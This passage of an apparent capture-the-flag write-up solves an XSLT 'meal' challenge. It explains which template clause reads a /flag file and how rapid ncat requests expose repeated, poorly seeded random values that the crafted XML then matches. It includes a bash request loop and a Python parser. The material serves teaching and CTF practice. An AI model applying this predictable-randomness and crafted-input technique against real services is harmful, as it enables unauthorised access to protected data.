the variable <strong>c</strong> will get the head (first element) of the plate list inside the tag course, and <strong>r</strong> will be setted into the <strong>rest</strong> plates of the list, <strong>position()&gt;1</strong> will select all the plates above the position 1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:if test=&quot;count($course) &gt; 0&quot;&gt;</span><br><span class="line">    &lt;xsl:variable name=&quot;c&quot; select=&quot;$course[1]&quot; /&gt;</span><br><span class="line">    &lt;xsl:variable name=&quot;r&quot; select=&quot;$course[position()&gt;1]&quot; /&gt;</span><br><span class="line">    &lt;xsl:choose&gt;</span><br><span class="line">        &lt;xsl:when test=&quot;count($c/宫保鸡丁) = 1&quot;&gt;</span><br><span class="line">            &lt;xsl:message&gt;</span><br><span class="line">                &lt;chef-drinks&gt;</span><br><span class="line">                    &lt;xsl:copy-of select=&quot;$chef-drinks&quot;/&gt;</span><br><span class="line">                &lt;/chef-drinks&gt;</span><br><span class="line">            &lt;/xsl:message&gt;</span><br><span class="line">            &lt;xsl:message&gt;</span><br><span class="line">                &lt;drinks&gt;</span><br><span class="line">                    &lt;xsl:copy-of select=&quot;$drinks&quot;/&gt;</span><br><span class="line">                &lt;/drinks&gt;</span><br><span class="line">            &lt;/xsl:message&gt;</span><br><span class="line">            &lt;xsl:call-template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;$chef-drinks&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;food-eaten&quot; select=&quot;$food-eaten + 1&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;course&quot; select=&quot;$r&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;drinks&quot; select=&quot;$drinks&quot;/&gt;</span><br><span class="line">            &lt;/xsl:call-template&gt;</span><br><span class="line">        &lt;/xsl:when&gt;</span><br><span class="line">        &lt;xsl:when test=&quot;count($c/paella) = 1&quot;&gt;</span><br><span class="line">            &lt;xsl:variable name=&quot;newdrinks&quot;&gt;</span><br><span class="line">                &lt;value&gt;</span><br><span class="line">                    &lt;xsl:value-of select=&quot;$c/paella + 0&quot;/&gt;</span><br><span class="line">                &lt;/value&gt;</span><br><span class="line">                &lt;xsl:copy-of select=&quot;$drinks&quot;/&gt;</span><br><span class="line">            &lt;/xsl:variable&gt;</span><br><span class="line">            &lt;xsl:call-template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;$chef-drinks&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;food-eaten&quot; select=&quot;$food-eaten + 1&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;course&quot; select=&quot;$r&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;drinks&quot; select=&quot;exsl:node-set($newdrinks)//value&quot;/&gt;</span><br><span class="line">            &lt;/xsl:call-template&gt;</span><br><span class="line">        &lt;/xsl:when&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Clause-Analysis"><a href="#Clause-Analysis" class="headerlink" title="Clause Analysis"></a>Clause Analysis</h3><p>I will only explain 3 clauses, since my solution only uses 3 it makes sense to only explain these ones.</p><p>Analysing the first <strong>case-clause</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:when test=&quot;count($c/宫保鸡丁) = 1&quot;&gt;</span><br></pre></td></tr></table></figure><p>We can already update out XML into this, since <strong>$c</strong> is a plate we will need a new <strong>tag</strong> which are named into this weird names, if we want to enter into this clause:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">宫保鸡丁</span>&gt;</span>4<span class="tag">&lt;/<span class="name">宫保鸡丁</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">        1</span><br><span class="line">       <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">        1</span><br><span class="line">       <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause 宫保鸡丁 , as we can see below it only prints the current <strong>chef drinks</strong> and the current <strong>drinks</strong>, in the end is recalling <strong>consume-meal</strong>, this will form a recursive function that will iterate all the plates created in the <strong>course</strong> tag, as we can see the parameters passed the only thing that changes is the <strong>$course</strong> the <strong>$r</strong> is passed into this parameter so we don’t get stuck in a infinite loop which is the usually the thing you do when creating a recursive function, oh the other change is obvious the incrementing of the variable <strong>food-eaten</strong>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:when test=&quot;count($c/宫保鸡丁) = 1&quot;&gt;</span><br><span class="line">    &lt;xsl:message&gt;</span><br><span class="line">        &lt;chef-drinks&gt;</span><br><span class="line">            &lt;xsl:copy-of select=&quot;$chef-drinks&quot;/&gt;</span><br><span class="line">        &lt;/chef-drinks&gt;</span><br><span class="line">    &lt;/xsl:message&gt;</span><br><span class="line">    &lt;xsl:message&gt;</span><br><span class="line">        &lt;drinks&gt;</span><br><span class="line">            &lt;xsl:copy-of select=&quot;$drinks&quot;/&gt;</span><br><span class="line">        &lt;/drinks&gt;</span><br><span class="line">    &lt;/xsl:message&gt;</span><br><span class="line">    &lt;xsl:call-template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;$chef-drinks&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;food-eaten&quot; select=&quot;$food-eaten + 1&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;course&quot; select=&quot;$r&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;drinks&quot; select=&quot;$drinks&quot;/&gt;</span><br><span class="line">    &lt;/xsl:call-template&gt;</span><br><span class="line">&lt;/xsl:when&gt;</span><br></pre></td></tr></table></figure><p>Analysing the second <strong>case-clause</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:when test=&quot;count($c/दाल) = 1&quot;&gt;</span><br><span class="line">    &lt;xsl:if test=&quot;count($chef-drinks) = 0&quot;&gt;</span><br><span class="line">        &lt;xsl:copy-of select=&quot;document(&apos;/flag&apos;)&quot;/&gt;</span><br><span class="line">    &lt;/xsl:if&gt;</span><br><span class="line">    &lt;xsl:call-template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;$chef-drinks&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;food-eaten&quot; select=&quot;$food-eaten + 1&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;course&quot; select=&quot;$r&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;drinks&quot; select=&quot;$drinks&quot;/&gt;</span><br><span class="line">    &lt;/xsl:call-template&gt;</span><br><span class="line">&lt;/xsl:when&gt;</span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause दाल, we can see it will print and select a document “/flag” which will contain the flag we need, perhaps we need satisfy the condition <strong>count($chef-drinks) = 0</strong>, the <strong>chef-drinks</strong> is initialized with 5 random numbers (chef-drinks) so we need to find a clause that removes items from <strong>$chef-drinks</strong> so we reach the count of 0.</p><p>Analysing the third <strong>case-clause</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:when test=&quot;count($c/Борщ) = 1&quot;&gt;</span><br><span class="line">    &lt;xsl:variable name=&quot;arg0&quot;&gt;</span><br><span class="line">        &lt;value&gt;</span><br><span class="line">            &lt;xsl:value-of select=&quot;$drinks[1] + 0&quot;/&gt;</span><br><span class="line">        &lt;/value&gt;</span><br><span class="line">    &lt;/xsl:variable&gt;</span><br><span class="line">    &lt;xsl:call-template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;food-eaten&quot; select=&quot;$food-eaten + 1&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;course&quot; select=&quot;$r&quot;/&gt;</span><br><span class="line">        &lt;xsl:with-param name=&quot;drinks&quot; select=&quot;$drinks[position() &gt; 1]&quot;/&gt;</span><br><span class="line">    &lt;/xsl:call-template&gt;</span><br><span class="line">&lt;/xsl:when&gt;</span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause Борщ, the first drink in $drinks (drinks declared inside the state tag) is setted into arg0 variable, now analysing the recalling parameters we can see <strong>chef-drinks</strong> is being modified:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]&quot;/&gt;</span><br></pre></td></tr></table></figure><p>The select will remove the <strong>head</strong> of <strong>$chef-drinks</strong> based on a condition <strong>position() &gt; 1 or $chef-drinks[1] != $arg0</strong>, so to make this condition work we need either for both condition to be both false, or to at least <strong>position() &gt; 1</strong> to be true, unfortunately <strong>position() &gt; 1</strong> will never be true in this situation because <strong>position()</strong> will return the current position order in xml and since it’s not associated into any tag it will always return 1 because is associated to the <strong>root element meal</strong>, <strong>1 &gt; 1</strong> is always false so we need to make <strong>$chef-drinks[1] != $arg0</strong> to return false as well, the <strong>$chef-drinks</strong> are declared as <strong>random</strong> in the begining but as I said before the randomness is implemented in a wrong way, if we do fast requests we can get the same numbers as we can analyse it here:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ncat 35.246.237.11 1 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all/&gt;⏎                                                                          </span><br><span class="line"></span><br><span class="line">$ ncat 35.246.237.11 1 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all/&gt;</span><br></pre></td></tr></table></figure><p>The only <strong>case-clause</strong> that prints the $chef-drinks for us is <strong>宫保鸡丁</strong> , so the xml used to print the samples above was:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">宫保鸡丁</span>&gt;</span>4<span class="tag">&lt;/<span class="name">宫保鸡丁</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>But we ran into a problem here right? as you can see it prints <strong>chef-drinks</strong> into a single number, <strong>2790719341256416733922614505473645015994193916258</strong>, it looks like the message printing is joining all the 5 elements into a one number, for example if the random numbers were <strong>1,2,3,4,5</strong> the number that would be printed is <strong>12345</strong> , the problem is sometimes each drink will have a different length and we don’t have any way to tell which length each element has, so I decided to analyse a lot of occurrences.</p><p>To make sure the length of each <strong>$chef-drink</strong> I decided to modify a little bit the <strong>challenge.min.xslt</strong> file in my docker container so I could print those numbers as well, so right after the declared parameters in <strong>consume-meal</strong> I added this line:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:copy-of select=&quot;$chef-drinks&quot; /&gt;</span><br></pre></td></tr></table></figure><p>So at every iteration of <strong>consumer-meals</strong> the <strong>$chef-drinks</strong> will be printed like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ncat localhost 1337 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 993763458325537011481963110810288894381216985659 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 65, column 65.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 70, column 70.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;/all&gt;</span><br></pre></td></tr></table></figure><p>So after this I did this bash script:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##35.246.237.11 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..1000&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">var1=$(ncat localhost 1337 &lt; solution.xml | grep -Poh <span class="string">'\d&#123;4,&#125;'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>Running it into a file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash rofl.sh &gt; out</span><br></pre></td></tr></table></figure><p>So after saving the outputs into a file I got something like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>So after this I wrote a python script that reads this outputs and counts the length every number:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'out'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">lines = f.readlines()</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lines:</span><br><span class="line"><span class="keyword">print</span> map(len,l.strip().split(<span class="string">' '</span>)[:<span class="number">-5</span>])</span><br></pre></td></tr></table></figure><p>The output is something like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[47, 9, 10, 10, 9, 9]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[46, 10, 9, 8, 9, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">[50, 10, 10, 10, 10, 10]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>From the outputs I analysed that when the <strong>single number</strong> had a length of <strong>50</strong>, the <strong>chef-drinks</strong> would always have an equal length of <strong>10</strong>, the other lengths <strong>diverged</strong> into different things so I decided to only <strong>extract</strong> the numbers if the single number <strong>has a length of 50</strong>. So now we need to create a xml file according with the info we just got, but it needs to be done <strong>dynamically</strong> at least of the part of the drinks, because we need to be really <strong>fast</strong> on the requests to get the <strong>same</strong> number it’s only possible if you do in a program. So the structure the xml solution we want to form needs to be something like this:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 